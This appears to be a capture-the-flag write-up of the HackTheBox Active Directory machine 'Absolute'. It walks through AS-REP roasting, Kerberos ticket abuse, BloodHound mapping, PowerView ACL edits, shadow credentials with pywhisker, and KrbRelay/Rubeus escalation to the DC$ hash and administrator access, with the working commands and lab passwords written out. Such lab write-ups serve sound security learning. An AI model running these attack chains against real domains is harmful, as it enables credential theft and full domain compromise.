---
description: Tough enumeration...
---

# Absolute

This is an AD machine, so first we can begin with a port scan, and then go through the usual AD methodology for finding a weakpoint for this system.

## Gaining Access

Nmap Scan:

<figure><img src="../../../.gitbook/assets/image (2528).png" alt=""><figcaption></figcaption></figure>

Standard Ports. I added absolute.htb  and its DC into my hosts file for this machine, as it is standard HTB practice. There are few things to enumerate:

* Website enumeration for directories, exploits or whatever else is useful.
* DNS for hidden domains and endpoints
* SMB Shares and LDAP services that accept null credentials.
* Kerbrute to find usernames (last resort)

### Kerbrute and AS-REP

Interestingly, doing all of these revealed nothing useful, **except for my last resort.** Running a kerbrute reveals this:

<figure><img src="../../../.gitbook/assets/image (750).png" alt=""><figcaption></figcaption></figure>

This username wordlist was just within my machine from another machine that required it. Very useful! However, these usernames cannot be used to do anything, leading me to believe that there are other users on this domain.

Wordlist Used:

{% embed url="https://github.com/attackdebris/kerberos_enum_userlists/blob/master/A-Z.Surnames.txt" %}

So now we have some possible users. I wanted to try and fuzz along this line, since we know that the usernames are in this format. Because this machine is rated insane, the username we need is probably not within any common wordlist.&#x20;

So to circumvent this, I took the names.txt file from Seclists (/seclists/usernames/names/names.txt) then appended the front of each entry with a letter and brute forced it. From A - Z. This would produce a list of names with the prefix required.

<figure><img src="../../../.gitbook/assets/image (3980).png" alt=""><figcaption></figcaption></figure>

Everytime I would find a username, I would then test it for AS-REP roasting and check for null credentials. Eventually, I found this d.klay user.

<figure><img src="../../../.gitbook/assets/image (2577).png" alt=""><figcaption></figcaption></figure>

When testing this for AS-REP Roasting, it worked!

<figure><img src="../../../.gitbook/assets/image (2604).png" alt=""><figcaption></figcaption></figure>

Then we can crack this hash.

<figure><img src="../../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>

### Retrieving Tickets

It would seem that this set of credentials cannot grant us access via evil-winrm. There was a unique reason however.

<figure><img src="../../../.gitbook/assets/image (216).png" alt=""><figcaption></figcaption></figure>

We can attempt with LDAP as well and get a false result. It seems that **passwords are not accepted here**. So, the next form of authentication is through tickets. Now the goal is to somehow get a ticket to authenticate into the machine. Once we get some form of ticket, we can perhaps continue with Bloodhound, login or something.

I managed to retrieve a ticket using getTGT. We can then export this.

<figure><img src="../../../.gitbook/assets/image (3066).png" alt=""><figcaption></figcaption></figure>

We can attempt kerberoasting the machine to try and get some kind of service ticket using the credentials using GetUserSPNs. The output using the DC Domain is below:

<figure><img src="../../../.gitbook/assets/image (1331).png" alt=""><figcaption></figcaption></figure>

We can fix the clock skew issue pretty easily.

```bash
sudo apt install ntpdate
sudo timedatectl set-ntp false
sudo ntpdate -s absolute.htb
```

Kerberoasting reveals that there are no SPNs to roast. Instead, we can use this ticket with CME to enumerate LDAP and SMB. This was based on the documentation of CrackMapExec, which is something I did not know prior to this.

{% embed url="https://wiki.porchetta.industries/getting-started/using-kerberos" %}

<figure><img src="../../../.gitbook/assets/image (756).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (3048).png" alt=""><figcaption></figcaption></figure>

Really interesting output. We have found another user and credential!

### svc\_smb & Hounding

Running the same process, we can retrieve another ticket.

<figure><img src="../../../.gitbook/assets/image (577).png" alt=""><figcaption></figcaption></figure>

Interesting, now that we have a ticket, we can export this. I found that we can access shares from the DC using this ticket to authenticate ourselves.

<figure><img src="../../../.gitbook/assets/image (3344).png" alt=""><figcaption></figcaption></figure>

We can check out the 'Shared' share to find some interesting files.

<figure><img src="../../../.gitbook/assets/image (3369).png" alt=""><figcaption></figcaption></figure>

Interesting!  The program here seems to be some form of script that creates the binary.

```bash
#!/bin/bash

nim c -d:mingw --app:gui --cc:gcc -d:danger -d:strip $1
```

Poking around the shares, we don't seem to get much from it. I could decompiled the binary, and perhaps I could find a password there.&#x20;

The next step was to use Bloodhound, since we had credentials and a ticket.

<figure><img src="../../../.gitbook/assets/image (2428).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://github.com/jazzpizazz/BloodHound.py-Kerberos" %}

Now we just need to fire up bloodhound and neo4j to view this data in a neat format. Bloodhound reveals a few users that are significant.&#x20;

<figure><img src="../../../.gitbook/assets/image (418).png" alt=""><figcaption></figcaption></figure>

Out of all of these users, m.lovegod has the most privileges. The user owns the Network Audit group. **This group has GenericWrite over the WinRM\_User**, which I suspect is where the user flag would be. So our exploit path is clear.&#x20;

<figure><img src="../../../.gitbook/assets/image (2749).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (3748).png" alt=""><figcaption></figcaption></figure>

We now need to somehow get a ticket from the `m.lovegod` user and gain access as the `winrm_user` to get a shell.

### Test.exe

When I ran the binary on my Windows VM, it seems to exit straightaway. Weird, but maybe it was trying to make external connections. I started Wireshark to see what I could capture from it. I found this interesting bit here when I connected to the HTB VPN.

<figure><img src="../../../.gitbook/assets/image (3573).png" alt=""><figcaption></figcaption></figure>

We now have credentials for this user!&#x20;

### Pivoting

Now that we know that the `m.lovegod` user owns the Network Audit group, and members of that group have GenericWrite over the `winrm_user`, we need to somehow add him into the group. We can use `pywhisker` to do so.&#x20;

First, we need to request a ST using `impacket-getTGT` using these credentials. Then we can export to `KRB5CCNAME`.

<figure><img src="../../../.gitbook/assets/image (1133).png" alt=""><figcaption></figcaption></figure>

The tricky part was figuring out how to use this ticket. The easiest way to do this is to use a Windows VM connected to the VPN and run some Powerview commands on it, such as `Add-DomainObjectAcl` and stuff. We have to do this because it is not possible for us to use this ticket to add group members to the Network Audit group from a Linux machine. (I could not make pywhisker or dacledit) to work.

Anyways, I booted up a Windows VPN and did the following:

* Downloaded ActiveDirectory module and Powerview
* Connected to HTB VPN
* Added `absolute.htb` to the `C:\Windows\system32\drivers\etc\hosts` file
* Changed Internet time to `absolute.htb` (Control Panel > Clock and Region > Date and Time > Internet Time and add IP address)
* Changed Network DNS Server to the IP address of DC (Control Panel > Network and Internet > Network and Sharing Center > Change Adapter Settings > Properties of the VPN adapter > Internet Procotol Version 4 Properties > Add the IP of the DC to DNS server.

Then I ran these commands:

<pre class="language-powershell"><code class="lang-powershell"><strong>Import-Module .\PowerView.ps1
</strong><strong>$SecPassword = ConvertTo-SecureString "AbsoluteLDAP2022!" -AsPlainText -Force
</strong>$Cred = New-Object System.Management.Automation.PSCredential("Absolute.htb\m.lovegod", $SecPassword)
<strong>Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Network Audit" -Rights all -DomainController dc.absolute.htb -PrincipalIdentity "m.lovegod"
</strong>Add-ADPrincipalGroupMembership -Identity m.lovegod -MemberOf "Network Audit" -Credential $Cred -server dc.absolute.htb
</code></pre>

You might need to run the last 2 Powershell commands again and again until no errors come up. Afterwards, we can switch back to the Kali machine **quickly!** The AD machine seems to reset this change in configurations super fast.

We need to then run this:

{% code overflow="wrap" %}
```bash
impacket-getTGT 'absolute.htb/m.lovegod:AbsoluteLDAP2022!' -dc-ip dc.absolute.htb; export KRB5CCNAME=m.lovegod.ccache; python3 pywhisker.py -d absolute.htb -u "m.lovegod" -k --no-pass -t "winrm_user" --action "add"
```
{% endcode %}

Afterwards, we should get a .pfx file.

<figure><img src="../../../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

Now we have a .pfx file that we can use to get a .ccache file for the `winrm_user`. This can be done with `gettgtpkinit.py`.

{% code overflow="wrap" %}
```bash
python3 gettgtpkinit.py absolute.htb/winrm_user -cert-pfx pWOtRDep.pfx -pfx-pass 1k8t3aDNsx44g7mTAwY5 winrm_user
export KRB5CCNAME = winrm_user.ccache
evil-winrm -i dc.absolute.htb -r absolute.htb
```
{% endcode %}

This would give us an evil\_winrm shell as the user and we can grab the flag.

<figure><img src="../../../.gitbook/assets/image (737).png" alt=""><figcaption></figcaption></figure>

The GenericWrite permission on the user allows us to write properties. Hence, we used `pywhisker` to add a new KeyCredential as `m.lovegod` to the `winrm_user` msDs-KeyCredentialLink attribute. This was done **because we don't have a shell**.&#x20;

By creating a shadow credential through GenericWrite privileges, we can add more methods of which an account has to obtain a Kerberos TGT. pyWhisker is just a Python implementation of the main tool, Whisker. The main resource I used for my research was here:

{% embed url="https://pentestlab.blog/tag/msds-keycredentiallink/" %}

## Privilege Escalation

### KrbRelay

The central theme around this machine is to continuously use Kerberos to escalate our privileges. We know that this machine supports PKINIT, allowing for users to authenticate with certificates (that's how we got our user access). Going along that line, we can continue to abuse Shadow Credentials to dump the NTLM hashes.

{% embed url="https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html" %}

First, we need the following:

* KrbRelay
* Rubeus
* RunasCs

Then, we need to first add a Shadow Credential using KrbRelay through the `m.lovegod` account.&#x20;

{% code overflow="wrap" %}
```
.\runasc.exe m.lovegod AbsoluteLDAP2022! -d absolute.htb -l 9 "C:\Users\winrm_user\krbrelay.exe -spn ldap/dc.absolute.htb -clsid {752073A1-23F2-4396-85F0-8FDB879ED0ED} -shadowcred"
```
{% endcode %}

This would generate an output like this:

<figure><img src="../../../.gitbook/assets/image (3179).png" alt=""><figcaption></figcaption></figure>

What this command does is use a CLSID in order to first add a new msDS-KeyCredentialLink, which would generate another certificate for us similar to `pywhisker`. Afterwards, we can use this certificate to request a TGT as DC$ and get the NTLM hash.

<pre data-overflow="wrap"><code><strong>.\rubeus.exe asktgt /user:DC$ /certificate:&#x3C;CERT> /password:"&#x3C;PASSWORD>" /getcredentials /show
</strong></code></pre>

This would generate the NTLM hash for us:

<figure><img src="../../../.gitbook/assets/image (996).png" alt=""><figcaption></figcaption></figure>

Afterwards, we can use `crackmapexec` with this hash to dump the credentials out.

<figure><img src="../../../.gitbook/assets/image (2093).png" alt=""><figcaption></figcaption></figure>

Then, pass the hash via `evil-winrm` as the administrator.

<figure><img src="../../../.gitbook/assets/image (3422).png" alt=""><figcaption></figcaption></figure>
